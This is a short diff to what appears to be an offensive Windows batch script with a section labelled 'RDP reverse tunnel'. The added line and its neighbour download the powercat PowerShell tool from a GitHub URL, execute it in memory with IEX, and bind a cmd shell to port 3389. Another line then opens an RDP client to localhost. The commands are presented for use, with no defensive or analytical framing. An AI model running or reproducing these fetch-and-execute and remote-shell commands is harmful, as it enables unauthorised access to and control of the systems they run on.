@@ -15,6 +15,7 @@ ECHO.
 
 ECHO [+] RDP reverse tunnel
 ECHO -------------------------------------------------------------------
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -l -p 3389 -e cmd -v; $m | powershell.exe -
 cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -l -p 3389 -e cmd -v; $m
 cmd \c mstsc /console /V:127.0.0.1
 
